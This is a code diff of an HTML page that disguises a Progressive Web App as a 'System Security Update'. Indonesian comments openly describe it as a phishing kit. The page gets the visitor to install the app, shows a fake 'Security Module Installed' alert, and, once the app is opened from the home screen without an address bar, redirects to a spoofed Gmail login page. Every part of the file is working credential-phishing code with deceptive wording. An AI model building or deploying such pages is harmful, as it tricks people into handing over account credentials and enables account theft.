@@ -5,42 +5,69 @@
 <link rel="manifest" href="manifest.json">
 <style>
   body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
-  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 85%; display: none; }
-  #status { color: #9aa0a6; margin-bottom: 30px; font-size: 14px;}
+  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 85%; display: none; margin-top: 20px;}
+  #status { color: #9aa0a6; margin-bottom: 10px; font-size: 14px;}
+  #debug-log { font-size: 12px; color: #34a853; margin-top: 20px; text-align: left; padding: 10px; }
 </style>
 </head>
 <body>
-  <h2>System Update Required</h2>
-  <p id="status">Scanning device compatibility...</p>
+  <h2>System Security Update</h2>
+  <p id="status">Waiting for system handshake...</p>
   
-  <!-- Tombol ini cuma muncul kalo Chrome ngizinin instalasi -->
-  <button class="btn" id="installBtn">Install Security Update</button>
+  <button class="btn" id="installBtn">1. Activate Security Module</button>
+
+  <div id="debug-log">Status: Initializing...</div>
 
 <script>
-// Cek jika aplikasi dibuka dari Home Screen (Mode Standalone)
+const log = (msg) => {
+    document.getElementById('debug-log').innerHTML += "<br>> " + msg;
+};
+
+// Cek standalone mode (buat phishing-nya)
 if (window.matchMedia('(display-mode: standalone)').matches) {
-    // IMPACT: Redirect langsung ke halaman login palsu lu
-    // Karena tidak ada Address Bar, user tidak bisa melihat domain ologoligature.github.io
-    window.location.href = "https://ologoligature.github.io/login-gmail-spoof.html";
+    log("Standalone mode detected. Redirecting...");
+    window.location.href = "login-gmail-spoof.html";
 }
 
 let deferredPrompt;
+const installBtn = document.getElementById('installBtn');
+const statusText = document.getElementById('status');
+
+log("Looking for manifest...");
+
 window.addEventListener('beforeinstallprompt', (e) => {
+    log("Event captured! Device compatible.");
     e.preventDefault();
     deferredPrompt = e;
-    document.getElementById('installBtn').style.display = 'block';
+    
+    installBtn.style.display = 'block';
+    statusText.innerText = "Compatibility confirmed.";
 });
 
-document.getElementById('installBtn').addEventListener('click', async () => {
+installBtn.addEventListener('click', async () => {
     if (deferredPrompt) {
+        log("Triggering prompt...");
         deferredPrompt.prompt();
-        // Setelah klik install, kita beri instruksi palsu
         const { outcome } = await deferredPrompt.userChoice;
         if (outcome === 'accepted') {
-            alert("Security Module Installed. Please open 'Google' from your home screen to complete verification.");
+            log("User accepted installation.");
+            alert("Security Module Installed. Open 'googlelogoligature' from Home Screen.");
         }
+        deferredPrompt = null;
     }
 });
+
+// Trick: Paksa user interaksi biar Chrome nembak event
+window.addEventListener('scroll', () => {
+    log("User interaction detected...");
+}, {once: true});
+
+// Tambahan buat mastiin service worker jalan (opsional tapi ngebantu PWA)
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('sw.js').then(() => {
+        log("Service Worker Active.");
+    });
+}
 </script>
 </body>
 </html>
